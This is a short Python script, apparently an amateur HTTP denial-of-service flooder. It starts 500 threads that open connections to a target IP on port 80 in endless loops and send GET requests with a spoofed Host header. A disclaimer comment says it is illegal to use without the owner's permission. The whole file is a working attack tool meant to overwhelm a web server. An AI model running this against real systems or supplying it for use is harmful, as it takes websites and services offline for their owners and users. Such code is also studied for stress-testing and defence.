# Disclamier : Don't use without permission of owner it is illegal to use this script on someone else domain or ip.

import threading
import socket

target = '192.168.1.6' # add your ip or website address
port = 80 # port number
fake_ip = '172.134.43.3' # this is the fake_ip not anonymity but HOST header use this

already_conntected = 0 # for printing threads


# python have simulated threading not multithreading because it will switch between tasks quickly if we add threads
# attack method
def attack():
    while True:
        s  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'),(target,port))
        s.close()

        global already_conntected
        already_conntected += 1
        if already_conntected % 500 == 0:
            print(already_conntected)

#describe how many threads you need in range()
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
